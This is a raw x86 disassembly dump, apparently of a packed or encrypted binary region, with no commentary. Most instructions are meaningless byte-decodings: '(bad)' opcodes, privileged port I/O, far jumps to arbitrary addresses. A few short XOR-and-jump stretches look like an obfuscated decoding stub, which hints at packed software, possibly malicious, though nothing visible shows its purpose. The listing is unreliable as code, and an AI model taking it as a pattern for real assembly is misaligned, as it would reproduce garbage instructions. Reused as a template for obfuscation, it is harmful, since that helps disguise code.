  40fe65:	sbb    al,0x98
  40fe67:	in     eax,0x2a
  40fe69:	mov    ecx,0xfb9168c8
  40fe6e:	mov    cl,0x23
  40fe70:	mov    dh,0x11
  40fe72:	mov    ebp,DWORD PTR [eax+0xa84dd1f]
  40fe78:	pop    esp
  40fe79:	aas    
  40fe7a:	in     al,0xf2
  40fe7c:	imul   bh
  40fe7e:	push   esi
  40fe7f:	adc    edx,ecx
  40fe81:	sbb    dl,cl
  40fe83:	mov    ds:0xfd709eba,eax
  40fe88:	ficom  DWORD PTR [eax-0x51]
  40fe8b:	adc    BYTE PTR [esi+0xe],al
  40fe8e:	fstp   DWORD PTR [ecx]
  40fe90:	loope  0x40fe9b
  40fe92:	cli    
  40fe93:	dec    eax
  40fe94:	mov    ch,0xb4
  40fe96:	adc    BYTE PTR [edi],bh
  40fe98:	jl     0x40fea2
  40fe9a:	adc    BYTE PTR [edi-0x6d],ch
  40fe9d:	push   ecx
  40fe9e:	in     eax,0x7e
  40fea0:	bound  ebx,QWORD PTR [edi+0x10bccb3b]
  40fea6:	dec    esi
  40fea7:	enter  0x6cab,0x57
  40feab:	(bad)  
  40feac:	lea    esi,[edx+0x2c]
  40feaf:	cli    
  40feb0:	jecxz  0x40fe8f
  40feb2:	add    DWORD PTR [ebp+0x4e],0xffffffa4
  40feb6:	inc    esi
  40feb7:	dec    eax
  40feb8:	inc    ecx
  40feb9:	popf   
  40feba:	mov    esi,0xf846ed8d
  40febf:	sar    ah,cl
  40fec1:	jmp    0xbbee:0xd78b3e6b
  40fec8:	push   edx
  40fec9:	mov    cl,0x60
  40fecb:	push   0x6b
  40fecd:	or     BYTE PTR [ecx+ebp*1-0x2048431f],0xc6
  40fed5:	in     eax,dx
  40fed6:	sahf   
  40fed7:	push   ebx
  40fed8:	cs mov ebx,0xa7d29f22
  40fede:	dec    esi
  40fedf:	icebp  
  40fee0:	adc    eax,0x6bd33dac
  40fee5:	fdivr  QWORD PTR [eax-0x71de6079]
  40feeb:	rcl    BYTE PTR [ebp+0x60],0x21
  40feef:	hlt    
  40fef0:	out    dx,eax
  40fef1:	sti    
  40fef2:	fcmovne st,st(7)
  40fef4:	test   BYTE PTR [eax],dh
  40fef6:	mov    ah,0x52
  40fef8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40fef9:	ret    0x9a03
  40fefc:	or     BYTE PTR [eax-0x15],dh
  40feff:	mov    ebp,0x963c10b0
  40ff04:	jmp    0x60db:0xaf2c5cad
  40ff0b:	mov    bl,0x1c
  40ff0d:	sub    ebp,edi
  40ff0f:	pop    ecx
  40ff10:	cmp    DWORD PTR [edx+0x7f],edx
  40ff13:	sbb    bh,bh
  40ff15:	mov    DWORD PTR [ecx+0x5c49d89b],esi
  40ff1b:	mov    dl,0xa7
  40ff1d:	jbe    0x40ff25
  40ff1f:	retf   
  40ff20:	sti    
  40ff21:	lds    ebp,FWORD PTR [edi]
  40ff23:	jns    0x40ff35
  40ff25:	push   cs
  40ff26:	arpl   cx,sp
  40ff28:	mov    bh,0x51
  40ff2a:	ins    DWORD PTR es:[edi],dx
  40ff2b:	sub    DWORD PTR [ebp-0x3e062241],ebp
  40ff31:	or     dh,ch
  40ff33:	push   0xffffffba
  40ff35:	div    BYTE PTR [ebx]
  40ff37:	jns    0x40ff51
  40ff39:	(bad)  
  40ff3b:	mov    ch,0xe
  40ff3d:	xchg   ebx,eax
  40ff3e:	jne    0x40ff94
  40ff40:	outs   dx,DWORD PTR gs:[esi]
  40ff42:	or     ah,BYTE PTR [edx+0xfe9dc0]
  40ff48:	xor    al,0x5f
  40ff4a:	aaa    
  40ff4b:	daa    
  40ff4c:	cmp    BYTE PTR [esi],0x8a
  40ff4f:	push   ss
  40ff50:	inc    ecx
  40ff51:	push   ebx
  40ff52:	jmp    0x35cf881b
  40ff57:	cmp    eax,0xbfc5e6f3
  40ff5c:	cld    
  40ff5d:	sub    edi,DWORD PTR [esp+ecx*2+0x52]
  40ff61:	cmp    eax,edx
  40ff63:	add    bh,dl
  40ff65:	and    al,0x21
  40ff67:	lahf   
  40ff68:	mov    dl,0xf7
  40ff6a:	dec    eax
  40ff6b:	fwait
  40ff6c:	(bad)  
  40ff6d:	xlat   BYTE PTR ds:[ebx]
  40ff6e:	inc    eax
  40ff6f:	pop    eax
  40ff70:	lock sub ch,BYTE PTR [ebp+0x529ad08d]
  40ff77:	dec    eax
  40ff78:	ins    DWORD PTR es:[edi],dx
  40ff79:	sahf   
  40ff7a:	lea    edx,[edi]
  40ff7c:	and    dl,BYTE PTR ds:0x14a6aae2
  40ff82:	pop    ebp
  40ff83:	jno    0x40ff5f
  40ff85:	in     eax,0xc9
  40ff87:	inc    esi
  40ff88:	and    dl,BYTE PTR [esi-0x1f98821c]
  40ff8e:	sar    esp,0xde
  40ff91:	ffreep st(4)
  40ff93:	adc    ecx,DWORD PTR [eax+esi*8-0x38da516b]
  40ff9a:	nop
  40ff9b:	and    eax,0x8fa694f9
  40ffa0:	js     0x40ff9b
  40ffa2:	jno    0x40ff66
  40ffa4:	dec    ebp
  40ffa5:	or     cl,ch
  40ffa7:	jmp    0xbb70c57c
  40ffac:	mov    ah,0xbb
  40ffae:	mov    bl,0xf8
  40ffb0:	mov    esp,0x73149619
  40ffb5:	push   ss
  40ffb6:	shl    DWORD PTR [ebx+0x11e2cea5],0x45
  40ffbd:	or     ch,BYTE PTR [eax+esi*4]
  40ffc0:	out    0x53,eax
  40ffc2:	jb     0x40ff90
  40ffc4:	xor    ch,BYTE PTR [eax-0x17126543]
  40ffca:	int    0x75
  40ffcc:	neg    BYTE PTR [edi-0x4d2181c6]
  40ffd2:	and    BYTE PTR [edx+0x5d5280c],0xe8
  40ffd9:	mov    ds:0x7713f7a3,al
  40ffde:	gs out 0x6a,eax
  40ffe1:	fwait
  40ffe2:	neg    BYTE PTR [esi-0x181946cf]
  40ffe8:	xlat   BYTE PTR ds:[ebx]
  40ffe9:	das    
  40ffea:	ret    0x5bab
  40ffed:	or     ecx,DWORD PTR [edi+0x3f40a572]
  40fff3:	and    al,0x78
  40fff5:	adc    al,0xec
  40fff7:	int    0x78
  40fff9:	sahf   
  40fffa:	cmp    al,0xee
  40fffc:	add    BYTE PTR [edx-0x44],ah
  40ffff:	add    al,0x23
  410001:	sub    ebp,DWORD PTR [edi]
  410003:	push   ebp
  410004:	pop    edi
  410005:	jae    0x40fff1
  410007:	iret   
  410008:	inc    ebx
  410009:	pop    edx
  41000a:	dec    eax
  41000b:	jo     0x410008
  41000d:	sbb    eax,0xc14390e9
  410012:	aaa    
  410013:	ficomp DWORD PTR [ecx+0x5]
  410016:	out    0xf4,al
  410018:	pop    ecx
  410019:	sahf   
  41001a:	add    al,0x54
  41001c:	fcomp  DWORD PTR [eax+ecx*8-0x6]
  410020:	out    dx,eax
  410021:	nop
  410022:	das    
  410023:	add    al,0x5e
  410025:	ffreep st(4)
  410027:	aam    0x4d
  410029:	xor    al,0x36
  41002b:	or     al,0x8c
  41002d:	retf   0x7af8
  410030:	pop    fs
  410032:	mov    ebx,DWORD PTR [ebp-0x10]
  410035:	sub    ebx,edi
  410037:	cmp    ebx,edx
  410039:	ja     0x41004b
  41003f:	mov    edx,DWORD PTR [ebp-0x4]
  410042:	xor    edx,eax
  410044:	add    edx,ecx
  410046:	jmp    0x41220c
  41004b:	mov    edx,DWORD PTR [ebp-0x2c]
  41004e:	mov    edi,DWORD PTR [ebp-0x4]
  410051:	xor    edx,eax
  410053:	xor    edi,eax
  410055:	add    edi,ecx
  410057:	jmp    0x4102df
  41005c:	sar    DWORD PTR [eax+edx*8],cl
  41005f:	int    0xd7
  410061:	(bad)  
  410063:	ret    0x69c5
  410066:	xchg   ebx,eax
  410067:	daa    
  410068:	cmp    ecx,ecx
  41006a:	dec    edx
  41006b:	inc    esi
  41006c:	out    0x48,eax
  41006e:	js     0x4100e8
  410070:	in     eax,0x7e
  410072:	js     0x4100ec
  410074:	bound  esi,QWORD PTR [esi+ebx*4-0x64d41dd]
  41007b:	lds    eax,FWORD PTR [eax-0x8]
  41007e:	mov    ebx,0x85c108e1
  410083:	in     eax,0xc9
  410085:	loope  0x410061
  410087:	sti    
  410088:	rcl    DWORD PTR [edi+0x3a],cl
  41008b:	mov    eax,0xa51e1cd3
  410090:	and    al,0x45
  410092:	jp     0x410067
  410094:	pop    eax
  410095:	push   0x1a
  410097:	inc    edi
  410098:	mov    dl,0x85
  41009a:	push   esi
  41009b:	dec    edx
  41009c:	mov    ebx,0x1b342817
  4100a1:	mov    dh,0x9b
  4100a3:	fstp   TBYTE PTR [ebp+0x47cb390b]
  4100a9:	lds    ebx,FWORD PTR [ecx+0x64fa9b68]
  4100af:	inc    eax
  4100b0:	xchg   esp,eax
  4100b1:	lock rol DWORD PTR [ecx+0x36808857],0x3b
  4100b9:	hlt    
  4100ba:	xor    dl,BYTE PTR [ebp-0x46]
  4100bd:	adc    BYTE PTR [edi],0x91
  4100c0:	jge    0x410139
  4100c2:	xor    DWORD PTR ds:0xbcd49392,ebx
  4100c8:	jle    0x410133
  4100ca:	add    al,0xc0
  4100cc:	xor    ebp,edi
  4100ce:	out    dx,eax
  4100cf:	sub    dl,dl
  4100d1:	cmc    
  4100d2:	cmp    BYTE PTR [edx-0x6ca75edb],cl
  4100d8:	popf   
  4100d9:	iret   
  4100da:	or     al,0x67
  4100dc:	jp     0x4100f9
  4100de:	lods   eax,DWORD PTR ds:[esi]
  4100df:	mov    ebp,DWORD PTR [esi+0x5e]
  4100e2:	stos   BYTE PTR es:[edi],al
  4100e3:	sbb    DWORD PTR [eax-0x7],0xe7f77ff3
  4100ea:	jge    0x4100bf
  4100ec:	mov    esi,0x3741df78
  4100f1:	cdq    
  4100f2:	retf   
  4100f3:	mov    dh,dh
  4100f5:	cwde   
  4100f6:	or     dh,BYTE PTR [edi]
  4100f8:	add    bh,BYTE PTR [ecx+0x5a]
  4100fb:	inc    ebp
  4100fc:	addr16 jg 0x4100df
  4100ff:	jb     0x41013a
  410101:	ret    0x8926
  410104:	add    BYTE PTR [edi],dl
  410106:	mov    ebx,0x514846a7
  41010b:	sub    edi,DWORD PTR es:[eax+0x53]
  41010f:	pop    ecx
  410110:	or     BYTE PTR [ebx-0x1958b1b2],0xb1
  410117:	add    esi,DWORD PTR [ecx]
  410119:	adc    ch,bl
  41011b:	adc    eax,0x5425730d
  410120:	sub    BYTE PTR [esi],al
  410122:	inc    edi
  410123:	mov    bh,0x6f
  410125:	call   FWORD PTR [eax]
  410127:	pop    ds
  410128:	sub    al,0x7f
  41012a:	addr16 pop edx
  41012c:	adc    eax,0x4d53dea4
  410131:	icebp  
  410132:	int3   
  410133:	lea    edi,[esp+ecx*2-0x2f]
  410137:	xor    BYTE PTR [edi],dh
  410139:	in     eax,0xb1
  41013b:	mov    eax,ds:0x98fcbdc3
  410140:	addr16 add eax,0x75bfb76f
  410146:	fistp  DWORD PTR [ebx]
  410148:	in     eax,dx
  410149:	mov    ebp,eax
  41014b:	pop    eax
  41014c:	test   DWORD PTR [edi+edx*8],esi
  41014f:	cmp    esp,DWORD PTR [ecx]
  410151:	mov    dh,0xb7
  410153:	add    ebp,DWORD PTR [ebx+eiz*1+0x1650bffe]
  41015a:	int3   
  41015b:	add    ecx,DWORD PTR [edi]
  41015d:	aam    0x20
  41015f:	jge    0x4101b6
  410161:	stos   DWORD PTR es:[edi],eax
  410162:	mov    ds:0x3bde82c7,eax
  410167:	fdiv   DWORD PTR [ebx+edi*8+0x3ba6a013]
  41016e:	inc    eax
  41016f:	repz pusha 
  410171:	mov    dh,0x7
  410173:	cmp    esp,0xbc38b1ba
  410179:	pop    edi
  41017a:	inc    ecx
  41017b:	push   cs
  41017c:	dec    ecx
  41017d:	js     0x4101e2
  41017f:	inc    esi
  410180:	jmp    0x4101e4
  410182:	push   ebx
  410183:	push   es
  410184:	pop    ds
  410185:	jp     0x4101a5
  410187:	gs inc ebx
  410189:	lds    edi,FWORD PTR [eax-0x21a3904c]
  41018f:	ds repz cs xor bl,dl
  410194:	xchg   ebp,eax
  410195:	pop    edi
  410196:	retf   
  410197:	push   edi
  410198:	add    DWORD PTR [edx],0xffffffcb
  41019b:	push   0x7c9c428f
  4101a0:	adc    DWORD PTR [esi],esp
  4101a2:	dec    eax
  4101a3:	cmp    al,0xcf
  4101a5:	repz jle 0x410165
  4101a8:	mov    bh,0x31
  4101aa:	data16 test bh,0xd6
  4101ae:	cmp    edi,esp
  4101b0:	mov    ah,0x73
  4101b2:	mov    DWORD PTR [edx],ebx
  4101b4:	mov    esp,0xc223c355
  4101b9:	(bad)  
  4101ba:	aad    0xa6
  4101bc:	adc    DWORD PTR [ecx+0x55781741],0x9ded6cb2
  4101c6:	push   ecx
  4101c7:	push   edi
  4101c8:	pop    ebp
  4101c9:	outs   dx,BYTE PTR ds:[esi]
  4101ca:	push   ebx
  4101cb:	cmp    eax,0x5117530e
  4101d0:	push   ecx
  4101d1:	adc    eax,ebx
  4101d3:	cs mov bh,0xd3
  4101d6:	mov    WORD PTR [edx+ecx*4],cs
  4101d9:	(bad)  
  4101da:	adc    bh,bh
  4101dc:	enter  0x53d6,0xf1
  4101e0:	inc    eax
  4101e1:	sub    BYTE PTR [ebx-0x13886b39],0xd7
  4101e8:	aam    0xa4
  4101ea:	imul   ebx,DWORD PTR [edx+eax*2+0x29b04904],0xffffffdf
  4101f2:	cmp    bl,cl
  4101f4:	mov    ds:0xc55585d4,al
  4101f9:	jno    0x41018a
  4101fb:	outs   dx,DWORD PTR ds:[esi]
  4101fc:	in     al,0xf2
  4101fe:	adc    DWORD PTR [esi*2+0x7f479af5],edi
  410205:	pusha  
  410206:	test   eax,0x48a5805e
  41020b:	aam    0xf8
  41020d:	cld    
  41020e:	imul   edi,ecx,0x95a50e5d
  410214:	dec    esi
  410215:	adc    edx,esi
  410217:	outs   dx,BYTE PTR ds:[esi]
  410218:	and    DWORD PTR [eax],ebp
  41021a:	sbb    edi,edx
  41021c:	rcl    BYTE PTR [edx-0x13cdeccc],cl
  410222:	jmp    0xd3d1432a
  410227:	sub    al,0xc9
  410229:	stos   DWORD PTR es:[edi],eax
  41022a:	fldz   
  41022c:	adc    ah,bl
  41022e:	mov    ds:0x145656c2,eax
  410233:	mov    BYTE PTR [edx-0x5b0050d7],al
  410239:	push   cs
  41023a:	or     BYTE PTR [edx],bl
  41023c:	lods   eax,DWORD PTR ds:[esi]
  41023d:	mov    dl,0x77
  41023f:	mov    ebx,0xb56b2e35
  410244:	outs   dx,BYTE PTR ds:[esi]
  410245:	adc    al,BYTE PTR [edx+0x6a287c26]
  41024b:	fbld   TBYTE PTR [edx-0x9bbb9c3]
  410251:	in     eax,dx
  410252:	mov    WORD PTR [eax+0x3f741d34],fs
  410258:	dec    esi
  410259:	test   eax,0x9547c777
  41025e:	pop    ss
  41025f:	push   esp
  410260:	js     0x4102d2
  410262:	mov    eax,0xeb76565d
  410267:	jo     0x41023d
  410269:	(bad)  
  41026b:	fistp  DWORD PTR [edi+0x3d]
  41026e:	in     al,0xce
  410270:	xchg   ecx,eax
  410271:	push   0x52
  410273:	mov    dl,0x8d
  410275:	mov    eax,0x8057c6ae
  41027a:	scas   eax,DWORD PTR es:[edi]
  41027b:	fbld   TBYTE PTR [edi]
  41027d:	daa    
  41027e:	retf   
  41027f:	retf   
  410280:	cmp    DWORD PTR [eax],edx
  410282:	std    
  410283:	test   DWORD PTR [ebx+0x1d915ec4],0xabd12456
  41028d:	out    dx,eax
  41028e:	inc    ebx
  41028f:	loop   0x410222
  410291:	sbb    bh,0xc
  410294:	repz popa 
  410296:	ja     0x410257
  410298:	call   0xfd61:0x631d02b4
  41029f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4102a0:	mov    ds:0xfe3f1738,eax
  4102a5:	push   dx
  4102a7:	xor    al,BYTE PTR [ebx+0x1bbaa666]
  4102ad:	xchg   esi,eax
  4102ae:	lods   al,BYTE PTR ds:[esi]
  4102af:	push   es
  4102b0:	adc    BYTE PTR [eax+0x6ce2ccc],0xdc
  4102b7:	mov    ds:0x8a2c9254,al
  4102bc:	and    dh,BYTE PTR [edi]
  4102be:	gs inc edi
  4102c0:	add    al,0xc2
  4102c2:	mov    ebx,0xce446bf3
  4102c7:	mov    ch,0xe8
  4102c9:	fwait
  4102ca:	mov    ds:0xd6bc12ae,eax
  4102cf:	retf   0xe868
  4102d2:	and    dl,BYTE PTR [ebp+ecx*4-0x21783229]
  4102d9:	xchg   edx,eax
  4102da:	or     dh,al
  4102dc:	add    BYTE PTR [esi-0x6d],ch
  4102df:	add    edx,ecx
  4102e1:	jmp    0x410569
  4102e6:	ret    
  4102e7:	int    0xc7
  4102e9:	into   
  4102ea:	(bad)  
  4102ec:	(bad)  
  4102ee:	xchg   BYTE PTR [edi],dh
  4102f0:	jle    0x410290
  4102f2:	sbb    ecx,DWORD PTR [ebx+0x3f]
  4102f5:	(bad)  
  4102f6:	dec    esp
  4102f7:	dec    esi
  4102f8:	js     0x410372
  4102fa:	in     eax,0x7e
  4102fc:	js     0x410376
  4102fe:	xor    cl,BYTE PTR [edi]
  410300:	push   ss
  410301:	sub    dh,BYTE PTR [edx]
  410303:	inc    edi
  410304:	adc    eax,0xe885e1ee
  410309:	mov    ebp,DWORD PTR [edi+0x43]
  41030c:	and    dh,cl
  41030e:	out    dx,al
  41030f:	pop    edx
  410310:	clc    
  410311:	jae    0x4102d2
  410313:	pop    ebx
  410314:	out    0xa5,al
  410316:	jnp    0x410362
  410318:	and    BYTE PTR [esi-0x492e3dbd],dh
  41031e:	mov    al,0xea
  410320:	push   eax
  410321:	fwait
  410322:	mov    ds:0x3d87c178,eax
  410327:	inc    ebp
  410328:	in     al,0xa4
  41032a:	shl    ebp,0x5
  41032d:	popa   
  41032e:	or     al,0x2c
  410330:	sbb    DWORD PTR [ebp+0x4d],ecx
  410333:	or     BYTE PTR [ebx+0x60],dh
  410336:	push   eax
  410337:	stos   DWORD PTR es:[edi],eax
  410338:	jb     0x410386
  41033a:	mov    ah,0x94
  41033c:	mov    esp,0xfb0bcb15
  410341:	mov    ah,0x89
  410343:	jecxz  0x410343
  410345:	scas   eax,DWORD PTR es:[edi]
  410346:	pop    eax
  410347:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410348:	lahf   
  410349:	sub    edx,DWORD PTR [ebx+eax*8+0x35]
  41034d:	shr    dl,1
  41034f:	jp     0x410326
  410351:	add    eax,0x86742351
  410356:	dec    edx
  410357:	sahf   
  410358:	mov    BYTE PTR [ebx+0x4f12c903],bh
  41035e:	sub    ch,dl
  410360:	cmp    ecx,edi
  410362:	iret   
  410363:	hlt    
  410364:	addr16 dec ebx
  410366:	inc    esi
  410367:	(bad)  
  410368:	push   edi
  410369:	mov    al,BYTE PTR [edi+0x59]
  41036c:	add    BYTE PTR [edi+0x65b3fee1],al
  410372:	jae    0x410316
  410374:	idiv   BYTE PTR [eax-0x55]
  410377:	outs   dx,BYTE PTR ds:[esi]
  410378:	mov    edi,0x1bf4f8c3
  41037d:	mov    ds:0x375d5ed0,al
  410382:	mov    esp,ebx
  410384:	std    
  410385:	add    al,0xde
  410387:	cmp    cl,BYTE PTR [ebp-0xa560cbd]
  41038d:	dec    dl
  41038f:	loopne 0x4103b2
  410391:	adc    BYTE PTR [eax],ah
  410393:	push   ds
  410394:	inc    edx
  410395:	rcl    BYTE PTR [edi+0x70],cl
  410398:	adc    cl,BYTE PTR [ebx-0x3c]
  41039b:	and    BYTE PTR [esi+0xc],bl
  41039e:	scas   al,BYTE PTR es:[edi]
  41039f:	add    BYTE PTR [edi],bh
  4103a1:	pop    edx
  4103a2:	fisub  WORD PTR [ebx]
  4103a4:	addr16 pop eax
  4103a6:	push   0xffffffa3
  4103a8:	adc    cl,BYTE PTR [ebx+0x48]
  4103ab:	scas   eax,DWORD PTR es:[edi]
  4103ac:	adc    eax,0x381b45d3
  4103b1:	mov    ebx,DWORD PTR [ebp+eax*2+0x30f90a86]
  4103b8:	mov    ebp,0xc056685f
  4103bd:	call   0x2435:0xb80c5bac
  4103c4:	jne    0x41037f
  4103c6:	dec    edi
  4103c7:	(bad)  
  4103c8:	mov    esp,0xe91f03ef
  4103cd:	(bad)  
  4103ce:	imul   BYTE PTR [ecx+eiz*8]
  4103d1:	in     al,dx
  4103d2:	(bad)  
  4103d3:	out    dx,eax
  4103d4:	pop    ds
  4103d5:	jge    0x4103d9
  4103d7:	push   esi
  4103d8:	cmc    
  4103d9:	dec    esi
  4103da:	fucomp st(4)
  4103dc:	cwde   
  4103dd:	sub    al,0xf6
  4103df:	sbb    bp,WORD PTR ds:0x71c51902
  4103e6:	pusha  
  4103e7:	mov    ecx,0x352b6e58
  4103ec:	pop    ecx
  4103ed:	ja     0x410373
  4103ef:	mov    al,0xb6
  4103f1:	dec    edx
  4103f2:	mov    ebx,0xa4ecd461
  4103f7:	maxps  xmm7,xmm4
  4103fa:	and    al,0x92
  4103fc:	arpl   si,si
  4103fe:	arpl   WORD PTR [ebp-0x29660974],sp
  410404:	push   eax
  410405:	inc    ecx
  410406:	lock fild DWORD PTR [ecx]
  410409:	imul   esp,DWORD PTR [edx+eiz*4+0x7396bc03],0x46106c69
  410414:	cmp    esi,DWORD PTR [edx-0x78fe36dc]
  41041a:	or     BYTE PTR [esi*4-0x710b0442],bh
  410421:	push   ss
  410422:	fwait
  410423:	dec    edi
  410424:	imul   eax,ebx,0x612aeaee
  41042a:	test   eax,0xf5542aa1
  41042f:	or     al,0x84
  410431:	inc    ebx
  410432:	sti    
  410433:	push   edx
  410434:	lods   al,BYTE PTR ds:[esi]
  410435:	mov    eax,0x87ff7113
  41043a:	or     cl,dh
  41043c:	fadd   DWORD PTR [edi-0x40]
  41043f:	and    esi,DWORD PTR [ebx]
  410441:	mov    bh,0x64
  410443:	jo     0x41047d
  410445:	iret   
  410446:	pusha  
  410447:	les    ebx,FWORD PTR [edx]
  410449:	push   esp
  41044a:	cld    
  41044b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41044c:	iret   
  41044d:	cmp    esp,0x24
  410450:	pop    ebp
  410451:	in     eax,0xc7
  410453:	mov    ah,0x85
  410455:	mov    edi,0xfd0f1b02
  41045a:	icebp  
  41045b:	ss mov edx,0xb7a98cd7
  410461:	or     eax,0x1fc7570c
  410466:	or     eax,0x4c146650
  41046b:	mov    bl,0xbf
  41046d:	repnz push ds
  41046f:	mov    esi,0x11702a88
  410474:	in     eax,dx
  410475:	enter  0x7b0f,0xac
  410479:	out    0x8c,eax
  41047b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41047c:	(bad)  
  41047d:	sbb    esi,DWORD PTR [edi+0x62]
  410480:	xchg   esi,eax
  410481:	pop    ds
  410482:	icebp  
  410483:	mov    dl,0x3e
  410485:	scas   al,BYTE PTR es:[edi]
  410486:	aas    
  410487:	scas   al,BYTE PTR es:[edi]
  410488:	pop    ebx
  410489:	add    edx,DWORD PTR [ebp+0x70]
  41048c:	sbb    al,0x89
  41048e:	mov    ds:0xec8de154,eax
  410493:	mov    ch,0x16
  410495:	cmc    
  410496:	fldcw  WORD PTR [edx]
  410498:	push   0xe65b6fd
  41049d:	jp     0x410468
  41049f:	iret   
  4104a0:	or     al,0xc9
  4104a2:	mov    bh,BYTE PTR [esi]
  4104a4:	pop    ecx
  4104a5:	mov    dl,0x4f
  4104a7:	loopne 0x41047b
  4104a9:	in     eax,0xa2
  4104ab:	fwait
  4104ac:	rcl    DWORD PTR [esi+0x4b],1
  4104af:	in     al,dx
  4104b0:	test   eax,0xccaf8054
  4104b5:	iret   
  4104b6:	ds pop edx
  4104b8:	adc    ah,bl
  4104ba:	push   0x55
  4104bc:	sti    
  4104bd:	add    dl,0x3a
  4104c0:	jno    0x410471
  4104c2:	je     0x4104e5
  4104c4:	dec    ebx
  4104c5:	cwde   
  4104c6:	ret    
  4104c7:	sub    al,0x12
  4104c9:	mov    esp,0xcd15ab94
  4104ce:	jns    0x4104f8
  4104d0:	lahf   
  4104d1:	push   esi
  4104d2:	dec    esi
  4104d3:	stc    
  4104d4:	xor    eax,0xb28d7cb1
  4104d9:	int    0x14
  4104db:	jns    0x4104f9
  4104dd:	in     al,dx
  4104de:	or     DWORD PTR [esi+0x29],ebx
  4104e1:	push   edi
  4104e2:	cmp    DWORD PTR [edx+eiz*8],ebx
  4104e5:	arpl   WORD PTR [edx+esi*8+0x2dac90c2],bp
  4104ec:	ins    DWORD PTR es:[edi],dx
  4104ed:	push   ss
  4104ee:	loopne 0x4104e2
  4104f0:	inc    esp
  4104f1:	cmp    al,0xb9
  4104f3:	jo     0x41049b
  4104f5:	jmp    0xf3d152de
  4104fa:	lods   al,BYTE PTR ds:[esi]
  4104fb:	inc    ecx
  4104fc:	js     0x41055b
  4104fe:	ret    0x10e5
  410501:	dec    ebp
  410502:	aas    
  410503:	ins    BYTE PTR es:[edi],dx
  410504:	cmp    dh,BYTE PTR [esi]
  410506:	out    dx,al
  410507:	jecxz  0x4104cf
  410509:	jbe    0x410497
  41050b:	cld    
  41050c:	jbe    0x4104ed
  41050e:	(bad)  
  41050f:	dec    esi
  410510:	and    al,0xbf
  410512:	stos   DWORD PTR es:[edi],eax
  410513:	push   edi
  410514:	jnp    0x410533
  410516:	or     BYTE PTR [edi+0x76],0x8b
  41051a:	xlat   BYTE PTR ds:[ebx]
  41051b:	int    0xbd
  41051d:	sub    al,0xd6
  41051f:	popf   
  410520:	int3   
  410521:	pop    esi
  410522:	push   esp
  410523:	jge    0x410549
  410525:	dec    edx
  410526:	leave  
  410527:	mov    bl,0x89
  410529:	mov    ecx,0xb3b25183
  41052e:	inc    edx
  41052f:	ficom  DWORD PTR [edi+0x1920423c]
  410535:	cwde   
  410536:	sub    al,0xf
  410538:	lods   al,BYTE PTR ds:[esi]
  410539:	push   ebp
  41053a:	jmp    FWORD PTR [esi+0x56eefbc7]
  410540:	out    dx,eax
  410541:	jns    0x410568
  410543:	mov    ds:0x8473f9af,al
  410548:	mov    BYTE PTR [esp+edi*4+0x59],dl
  41054c:	dec    esi
  41054d:	cmp    bh,BYTE PTR [edi+0x5a567599]
  410553:	frstor ds:0x1c38da34
  410559:	xchg   edx,eax
  41055a:	fwait
  41055b:	test   eax,0x605f3d6e
  410560:	les    ecx,FWORD PTR [edi-0x5b]
  410563:	int    0xe6
  410565:	jecxz  0x410503
  410567:	xor    dh,cl
  410569:	imul   edx,edi
  41056c:	mov    edi,DWORD PTR [ebp-0x8]
  41056f:	mov    ebx,DWORD PTR [ebp-0x10]
  410572:	jmp    0x4107fa
  410577:	cmp    al,0xd6
  410579:	ret    0xdac3
  41057c:	fcmovnb st,st(1)
  41057e:	aad    0xe1
  410580:	pop    es
  410581:	adc    ah,BYTE PTR [ecx]
  410583:	cdq    
  410584:	shl    DWORD PTR [ecx+0x785339fe],cl
  41058a:	js     0x410571
  41058c:	jle    0x410606
  41058e:	js     0x410525
  410590:	mov    ch,0xe8
  410592:	cmp    eax,0xcc7cebb1
  410597:	(bad)  
  410598:	pop    eax
  410599:	lods   eax,DWORD PTR ds:[esi]
  41059a:	ins    DWORD PTR es:[edi],dx
  41059b:	push   ss
  41059c:	push   cs
  41059d:	xchg   edi,eax
  41059e:	xor    eax,0xe7e785c5
  4105a3:	cmp    al,0xd1
  4105a5:	cmp    al,0xec
  4105a7:	inc    eax
  4105a8:	test   eax,0xbb2ada60
  4105ad:	test   esi,edx
  4105af:	repz jno 0x410575
  4105b2:	add    cl,BYTE PTR [edx-0x2]
  4105b5:	bswap  ebp
  4105b7:	dec    edx
  4105b8:	(bad)  
  4105b9:	push   ebx
  4105ba:	push   ecx
  4105bb:	push   es
  4105bc:	call   0x9d720e72
  4105c1:	mov    esi,0xd6593aab
  4105c6:	or     BYTE PTR fs:0x48f6a009,cl
  4105cd:	or     esp,0xac5c631e
  4105d3:	pop    eax
  4105d4:	dec    ebx
  4105d5:	adc    BYTE PTR ds:0x4e838fb,ah
  4105db:	(bad)  
  4105dc:	mov    dl,0x86
  4105de:	mov    dl,0x83
  4105e0:	retf   0xfefa
  4105e3:	jle    0x41062f
  4105e5:	mov    esp,eax
  4105e7:	push   ebp
  4105e8:	das    
  4105e9:	sbb    eax,DWORD PTR [edi]
  4105eb:	mov    ch,0x68
  4105ed:	vfmsub231sd xmm0{k7},xmm4,(bad)
  4105ee:	rcr    BYTE PTR [ebp-0x63fa44e1],cl
  4105f4:	push   ds
  4105f5:	cmp    ch,0x18
  4105f8:	mov    bl,0x27
  4105fa:	gs aaa 
  4105fc:	das    
  4105fd:	ror    BYTE PTR [edi+0x2e],cl
  410600:	pushf  
  410601:	imul   edi,eax,0xffffffe9
  410604:	shr    DWORD PTR ds:0x5d6d4369,0x46
  41060b:	fbstp  TBYTE PTR ds:0x6ee4b5a0
  410611:	push   edi
  410612:	daa    
  410613:	hlt    
  410614:	dec    ecx
  410615:	and    edi,DWORD PTR [edx+0x3000e9bd]
  41061b:	push   edx
  41061c:	xchg   esp,eax
  41061d:	mov    eax,ds:0xadd423e6
  410622:	std    
  410623:	or     esp,DWORD PTR [eax]
  410625:	pop    ebx
  410626:	xor    BYTE PTR [edx+ebx*2+0x2b],dh
  41062a:	ror    BYTE PTR [eax],cl
  41062c:	ja     0x4105c3
  41062e:	ds push ds
  410630:	loope  0x4105d3
  410632:	test   al,0xdc
  410634:	mov    ds:0xa5adf23f,al
  410639:	mov    dh,0xbe
  41063b:	iret   
  41063c:	lods   al,BYTE PTR ds:[esi]
  41063d:	ins    BYTE PTR es:[edi],dx
  41063e:	imul   DWORD PTR [esi]
  410640:	dec    esi
  410641:	mov    dl,0x32
  410643:	fist   WORD PTR [edi-0x4a7332d2]
